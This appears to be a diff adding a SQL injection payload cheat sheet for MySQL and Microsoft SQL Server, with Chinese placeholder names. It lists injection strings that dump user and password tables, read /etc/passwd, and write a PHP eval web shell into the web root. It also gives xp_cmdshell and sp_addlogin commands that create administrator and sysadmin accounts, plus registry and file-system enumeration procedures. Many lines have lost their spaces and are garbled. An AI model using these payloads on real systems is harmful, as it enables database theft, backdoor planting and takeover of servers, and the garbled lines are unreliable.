@@ -1,0 +1,63 @@
+selectgroup_concat(user)frommysql.user
+selectgroup_concat(password)frommysql.userwhereuser='root'
+SELECT group_concat(schema_name)frominformation_schema.schemata
+SELECT group_concat(table_name)frominformation_schema.tableswheretable_schema='库名'
+SELECT group_concat(table_name)frominformation_schema.table_constraintswheretable_schema='库名'
+SELECT group_concat(column_name)frominformation_schema.columnswheretable_name='表名'
+SELECT load_file('/etc/passwd')
+SELECT<?php@eval($_POST[1]);?>intooutfile'/var/www/html/shell.php'
+orderbynum
+and1=2UNION SELECT1,2或id=-1UNION SELECT1,2
+UNION SELECT1,password,3fromadmin
+?id=1OR(SELECT8627FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+?id=1andextractvalue(1,concat(0x7e,(select@@version),0x7e))
+?id=1andupdatexml(1,concat(0x7e,(SELECT@@version),0x7e),1)
+?id=261and1=(select*from(selectNAME_CONST(version(),1),NAME_CONST(version(),1))asx)
+id=1and(selectexp(~(select*from(selectuser())x)))
+if((bool),sleep(3),0)
+BENCHMARK(100000,MD5(1))orsleep(5)
+information_scheam MySQL
+substr() mid() substring()
+concat()
+database()
+USER()
+@@global.version_complie_os FROM mysql.user
+SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1 -- '
+?id=1' or 1=1 --
+SELECT first_name, last_name FROM users WHERE user_id = '$id' 
+and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')
+;exec master..xp_cmdshell "net user name password /add"--
+;exec master..xp_cmdshell "net localgroup name administrators /add"--
+and (select IS_SRVROLEMEMBER('sysadmin'))=1--
+and (select IS_MEMBER('db_owner'))=1--
+and (select IS_MEMBER('public'))=1--
+;exec master.dbo.sp_addlogin name,pass;--
+;exec master.dbo.sp_addsrvrolemember name,sysadmin;--
+execute master..sp_msgetversion
+execute master..xp_dirtree 'c:'
+execute master..xp_dirtree 'c:',1
+execute master..xp_dirtree 'c:',1,1
+execute master..xp_enumgroups
+execute master..xp_getnetname
+EXEC [master].[dbo].[xp_subdirs] 'c:\WINNT'
+execute master..xp_fixeddrives
+execute master..xp_getfiledetails 'C:1.txt'
+exec sp_MSforeachtable 'sp_spaceused ''?'''
+exec sp_MSforeachtable 'select ''?''','?', 'sp_spaceused ''?''', 'SELECT count(*) FROM ? '
+sp_MSforeachtable 'Update ? Set note='''' Where note is null',null,null,null,' AND o.name in (''Table1'',''Table2'')
+xp_ntsec_enumdomains
+xp_terminate_process 123
+dbo.xp_subdirs 'C:'
+xp_loginconfig
+xp_regaddmultistring
+xp_regdeletekey
+xp_regdeletevalue
+xp_regenumkeys
+xp_regenumvalues
+xp_regread
+xp_regremovemultistring
+xp_regwrite
+sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'
+create procedure sp_addextendedproc --- 1996/08/30 20:13
+@functname nvarchar(517),/* (owner.)name of function to call */
+@dllname varchar(255)/* name of DLL containing function */
